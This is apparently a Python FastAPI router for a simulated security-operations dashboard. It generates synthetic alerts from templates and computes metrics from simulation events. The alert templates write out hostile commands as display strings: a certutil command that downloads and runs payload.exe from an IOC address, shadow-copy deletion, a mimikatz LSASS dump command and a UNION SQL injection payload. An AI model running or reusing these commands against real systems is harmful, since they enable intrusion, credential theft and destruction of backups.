import uuid
import random
from datetime import datetime, timedelta
from fastapi import APIRouter, HTTPException
from typing import List

from simulation.engine import simulation_engine, THREAT_ACTORS, IOC_IPS
from api.models.schemas import SimulationRequest, AttackType, SeverityLevel, Alert

router = APIRouter(prefix="/simulation", tags=["simulation"])

# Alerts are generated only from real simulations — starts empty
_alerts: List[Alert] = []

REALISTIC_ALERT_TEMPLATES = [
    {
        "title": "{attack} Campaign — {actor}",
        "description": "Threat intelligence match: IOC {ip} linked to {actor} infrastructure. {count} connection attempts to {node} ({node_ip}). TTP alignment: {mitre}.",
        "severity": SeverityLevel.CRITICAL,
        "mitre": "T1071.001",
    },
    {
        "title": "Ransomware Pre-Encryption Activity on {node}",
        "description": "`vssadmin delete shadows /all` executed on {node} ({node_ip}). Shadow copy deletion is a precursor to ransomware deployment. Process: svchost.exe (PID {pid}). IMMEDIATE ACTION REQUIRED.",
        "severity": SeverityLevel.CRITICAL,
        "mitre": "T1490",
    },
    {
        "title": "Credential Dump — LSASS Memory Access",
        "description": "Process 'mimikatz.exe' (renamed: 'svchost32.exe') accessed LSASS memory (PID 872) on {node}. Technique: sekurlsa::logonpasswords. {count} credential sets likely harvested.",
        "severity": SeverityLevel.CRITICAL,
        "mitre": "T1003.001",
    },
    {
        "title": "Anomalous Data Exfiltration — {node}",
        "description": "Unusual outbound HTTPS traffic: {node} → {ip}:443. Volume: {size}MB in 12 minutes (10x baseline). Destination ASN: AS60068 (Datacamp Limited — known bulletproof hosting). Possible exfiltration.",
        "severity": SeverityLevel.HIGH,
        "mitre": "T1048.003",
    },
    {
        "title": "Registry Persistence Mechanism Installed",
        "description": "New registry run key added: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityUpdate = 'C:\\Users\\Public\\svchost32.exe'. Host: {node} ({node_ip}). User: DOMAIN\\{user}.",
        "severity": SeverityLevel.HIGH,
        "mitre": "T1547.001",
    },
    {
        "title": "Lateral Movement via WinRM — {node}",
        "description": "Invoke-Command executed remotely targeting {node} from {source_node}. Command: `Get-Process | Where-Object {$_.Name -eq 'lsass'}`. Credential: DOMAIN\\svc_backup.",
        "severity": SeverityLevel.HIGH,
        "mitre": "T1021.006",
    },
    {
        "title": "SQL Injection Attempt — Web Application",
        "description": "WAF triggered: UNION-based SQL injection on /api/v1/users endpoint. Payload: `' UNION SELECT username,password,NULL FROM users--`. Source: {ip}. Request rate: 847/min.",
        "severity": SeverityLevel.HIGH,
        "mitre": "T1190",
    },
    {
        "title": "Suspicious Scheduled Task Created",
        "description": "New scheduled task 'WindowsUpdater' created on {node}. Trigger: Every 30min. Action: `cmd /c certutil -urlcache -f http://{ip}/payload.exe C:\\Temp\\svc.exe && C:\\Temp\\svc.exe`. Matches APT28 TTPs.",
        "severity": SeverityLevel.MEDIUM,
        "mitre": "T1053.005",
    },
]

FAKE_USERS = ["jdupont", "amartin", "rbernard", "ksmith", "administrator", "svc_backup", "svc_deploy"]


def _make_alert(attack_type: str, node_id: str) -> Alert:
    node = next((n for n in simulation_engine.topology.nodes if n.id == node_id), None)
    node_ip = node.ip if node else "192.168.x.x"
    node_label = node.label if node else node_id
    actor = random.choice(THREAT_ACTORS)
    ip = random.choice(IOC_IPS)
    tmpl = random.choice(REALISTIC_ALERT_TEMPLATES)

    title = tmpl["title"].format(
        attack=attack_type.replace("_", " ").title(),
        actor=actor.split(" ")[0],
        node=node_label, ip=ip,
        source_node=random.choice([n.id for n in simulation_engine.topology.nodes if n.id != node_id]),
    )
    description = tmpl["description"].format(
        node=node_label, node_ip=node_ip, ip=ip,
        actor=actor, count=random.randint(127, 4847),
        size=round(random.uniform(47, 847), 1),
        mitre=tmpl["mitre"], pid=random.randint(1000, 9999),
        user=random.choice(FAKE_USERS),
        source_node=random.choice([n.label for n in simulation_engine.topology.nodes if n.id != node_id]),
    )

    return Alert(
        id=str(uuid.uuid4())[:8],
        title=title,
        description=description,
        severity=tmpl["severity"],
        timestamp=datetime.now() - timedelta(seconds=random.randint(0, 120)),
        node_id=node_id,
        attack_type=AttackType(attack_type) if attack_type in [a.value for a in AttackType] else None,
        mitre_technique=tmpl["mitre"],
        acknowledged=False,
    )


@router.post("/start")
async def start_simulation(request: SimulationRequest):
    result = await simulation_engine.run_simulation(request)
    return {
        "simulation_id": result.simulation_id,
        "status": "started",
        "attack_type": result.attack_type.value,
        "start_time": result.start_time.isoformat(),
    }


@router.get("/status/{simulation_id}")
async def get_simulation_status(simulation_id: str):
    result = simulation_engine.get_simulation_status(simulation_id)
    if not result:
        raise HTTPException(status_code=404, detail="Simulation not found")
    return result.model_dump(mode="json")


@router.get("/attacks")
async def get_attack_types():
    return [{"value": a.value, "label": a.value.replace("_", " ").title()} for a in AttackType]


@router.get("/alerts")
async def get_alerts(limit: int = 50):
    return [a.model_dump(mode="json") for a in sorted(_alerts, key=lambda x: x.timestamp, reverse=True)[:limit]]


@router.post("/alerts/generate")
async def generate_alerts(attack_type: str = "malware", count: int = 5):
    global _alerts
    compromised = [nid for nid, s in simulation_engine.node_states.items()
                   if s.value in ["compromised", "critical", "suspicious"]]
    target_nodes = compromised[:count] if compromised else list(simulation_engine.node_states.keys())[:count]
    new_alerts = [_make_alert(attack_type, n) for n in target_nodes]
    _alerts.extend(new_alerts)
    return [a.model_dump(mode="json") for a in new_alerts]


@router.delete("/alerts/{alert_id}")
async def acknowledge_alert(alert_id: str):
    global _alerts
    for alert in _alerts:
        if alert.id == alert_id:
            alert.acknowledged = True
            return {"status": "acknowledged"}
    raise HTTPException(status_code=404, detail="Alert not found")


@router.get("/metrics")
async def get_dashboard_metrics():
    all_sims = list(simulation_engine.active_simulations.values())

    # Count only nodes that are actually compromised right now
    compromised_count = len([
        nid for nid, status in simulation_engine.node_states.items()
        if status.value in ["compromised", "critical"]
    ])

    # Count only events from real simulations
    total_events = sum(len(s.events) for s in all_sims)
    active_sims = len([s for s in all_sims if s.status == "running"])

    # Threat score: 0 when nothing happened, grows with real compromises
    threat_score = min(100, compromised_count * 14 + active_sims * 8 + (total_events // 3))

    # Attack types: only from real simulations
    attack_type_counts: dict = {}
    for sim in all_sims:
        at = sim.attack_type.value
        attack_type_counts[at] = attack_type_counts.get(at, 0) + len(sim.events)

    top_attacks = sorted(
        [{"type": k, "count": v} for k, v in attack_type_counts.items()],
        key=lambda x: x["count"], reverse=True
    )[:6]

    # Timeline: 24 real hours, events placed in the hour they actually occurred
    now = datetime.now()
    # Build hour buckets from real simulation events
    hour_buckets: dict = {}
    for sim in all_sims:
        for ev in sim.events:
            h = ev.timestamp.strftime("%H:00")
            hour_buckets[h] = hour_buckets.get(h, {"attacks": 0, "blocked": 0})
            hour_buckets[h]["attacks"] += 1
            if not ev.success:
                hour_buckets[h]["blocked"] += 1

    timeline = []
    for i in range(24):
        hour_dt = now - timedelta(hours=23 - i)
        h = hour_dt.strftime("%H:00")
        bucket = hour_buckets.get(h, {"attacks": 0, "blocked": 0})
        timeline.append({
            "hour": h,
            "attacks": bucket["attacks"],
            "blocked": bucket["blocked"],
        })

    # Attacks blocked = events where success=False across all simulations
    attacks_blocked = sum(
        1 for sim in all_sims for ev in sim.events if not ev.success
    )

    unacked_alerts = [a for a in _alerts if not a.acknowledged]

    return {
        "total_attacks": total_events,
        "active_threats": active_sims + (1 if compromised_count > 0 else 0),
        "compromised_nodes": compromised_count,
        "threat_score": threat_score,
        "attacks_blocked": attacks_blocked,
        "network_health": max(0, 100 - threat_score - compromised_count * 5),
        "top_attack_types": top_attacks,
        "attack_timeline": timeline,
        "recent_alerts": [a.model_dump(mode="json") for a in
                          sorted(unacked_alerts, key=lambda x: x.timestamp, reverse=True)[:5]],
    }
